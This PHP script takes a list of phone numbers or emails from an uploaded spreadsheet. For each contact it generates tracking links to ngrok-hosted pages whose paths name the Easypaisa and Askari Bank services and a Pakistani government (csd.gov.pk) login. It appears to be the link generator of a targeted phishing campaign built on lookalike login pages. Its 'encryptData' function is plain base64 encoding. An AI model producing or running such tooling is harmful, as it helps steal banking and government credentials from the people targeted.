<?php
session_start();
require 'vendor/autoload.php';

use PhpOffice\PhpSpreadsheet\IOFactory;

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['excel_file'])) {
    $file = $_FILES['excel_file']['tmp_name'];

    if (!file_exists($file)) {
        die("Error: File not found.");
    }

    // Load spreadsheet
    $spreadsheet = IOFactory::load($file);
    $sheet = $spreadsheet->getActiveSheet();
    $data = $sheet->toArray();

    // Extract numbers/emails (assuming they are in the first column)
    $contacts = [];
    foreach ($data as $row) {
        if (!empty($row[0])) {
            $contacts[] = trim($row[0]);
        }
    }

    if (empty($contacts)) {
        die("No contacts found in the Excel file.");
    }

    // Function to encrypt data
    function encryptData($data) {
        return str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($data));
    }

    // Base links
    $base_links = [
        "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/php_login/php_login_system/testing_website/easypaisa.php",
        "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/askari_bank/logout.php",
        "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/csd_gov_pk/login.php"
    ];

    // Generate links for each contact
    $_SESSION['generated_links'] = [];
    foreach ($contacts as $contact) {
        $encryptedContact = encryptData($contact);
        foreach ($base_links as $link) {
            $_SESSION['generated_links'][] = "track_click.php?url=" . urlencode($link) . "&contact=" . urlencode($encryptedContact);
        }
    }

    // Redirect back to the dashboard to display generated links
    header("Location: Group Dashboard Ui.php");
    exit();
} else {
    die("Invalid request.");
}
?>
